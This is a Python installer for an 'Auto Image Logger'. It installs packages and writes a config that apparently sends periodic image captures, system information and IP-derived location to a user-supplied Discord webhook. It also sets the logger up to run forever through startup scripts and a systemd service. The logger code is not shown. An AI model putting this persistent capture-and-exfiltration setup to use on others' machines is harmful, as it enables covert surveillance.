#!/usr/bin/env python3
"""
Installation script for Auto Image Logger
"""

import os
import sys
import json
import subprocess
import platform


def install_dependencies():
    """Install required Python packages."""
    print("📦 Installing dependencies...")

    packages = ["requests", "pillow", "psutil"]

    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + packages)
        print("✅ Dependencies installed successfully")
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ Failed to install dependencies: {e}")
        return False


def create_startup_script():
    """Create startup script for auto-logger."""
    system = platform.system()

    if system == "Windows":
        script = """@echo off
python auto_image_logger.py
pause
"""
        filename = "start_auto_logger.bat"
    else:  # Linux/Mac
        script = """#!/bin/bash
python3 auto_image_logger.py
"""
        filename = "start_auto_logger.sh"
        # Make it executable

    with open(filename, 'w') as f:
        f.write(script)

    if system != "Windows":
        os.chmod(filename, 0o755)

    print(f"✅ Created startup script: {filename}")
    return filename


def create_service_file():
    """Create systemd service file for Linux."""
    if platform.system() != "Linux":
        return None

    service_content = """[Unit]
Description=Auto Image Logger Service
After=network.target

[Service]
Type=simple
User=%i
WorkingDirectory={working_dir}
ExecStart=/usr/bin/python3 {working_dir}/auto_image_logger.py
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
""".format(working_dir=os.getcwd())

    with open("auto-image-logger.service", 'w') as f:
        f.write(service_content)

    print("✅ Created systemd service file: auto-image-logger.service")
    print("\nTo install as a service:")
    print("  sudo cp auto-image-logger.service /etc/systemd/system/")
    print("  sudo systemctl daemon-reload")
    print("  sudo systemctl enable auto-image-logger.service")
    print("  sudo systemctl start auto-image-logger.service")

    return "auto-image-logger.service"


def main():
    """Main installation function."""
    print("=" * 60)
    print("🤖 AUTO IMAGE LOGGER - INSTALLATION")
    print("=" * 60)

    # Step 1: Install dependencies
    if not install_dependencies():
        print("❌ Installation failed at dependency step")
        return False

    # Step 2: Create auto_config.json if it doesn't exist
    if not os.path.exists("auto_config.json"):
        print("\n📝 Creating configuration file...")

        webhook_url = input("Enter your Discord webhook URL: ").strip()

        config = {
            "webhook_url": webhook_url,
            "capture_interval": 300,
            "image_quality": 85,
            "max_captures": 0,
            "save_locally": True,
            "local_save_path": "auto_captures",
            "compress_images": True,
            "max_image_size_mb": 8,
            "embed_color": 15158332,
            "include_timestamp": True,
            "include_system_info": True,
            "capture_location": True,
            "location_service": "ipapi",
            "location_timeout": 5,
            "start_delay": 10,
            "log_level": "INFO",
            "run_forever": True,
            "auto_start": True
        }

        with open("auto_config.json", 'w') as f:
            json.dump(config, f, indent=4)

        print("✅ Configuration file created")

    # Step 3: Create startup script
    print("\n🚀 Creating startup scripts...")
    startup_script = create_startup_script()

    # Step 4: Create service file for Linux
    if platform.system() == "Linux":
        create_service_file()

    # Step 5: Create directories
    print("\n📁 Creating directories...")
    os.makedirs("auto_captures", exist_ok=True)
    os.makedirs("session_logs", exist_ok=True)
    os.makedirs("logs", exist_ok=True)

    print("\n" + "=" * 60)
    print("✅ INSTALLATION COMPLETE!")
    print("=" * 60)
    print("\n📋 Quick Start Guide:")
    print(f"1. Edit auto_config.json to adjust settings")
    print(f"2. Run: {startup_script}")
    print(f"3. Check auto_logger.log for output")
    print(f"4. Use Ctrl+C to stop")

    # Test run option
    test_run = input("\nWould you like to test run now? (y/n): ").strip().lower()
    if test_run == 'y':
        print("\nStarting test run...")
        subprocess.run([sys.executable, "auto_image_logger.py"])

    return True


if __name__ == "__main__":
    main()
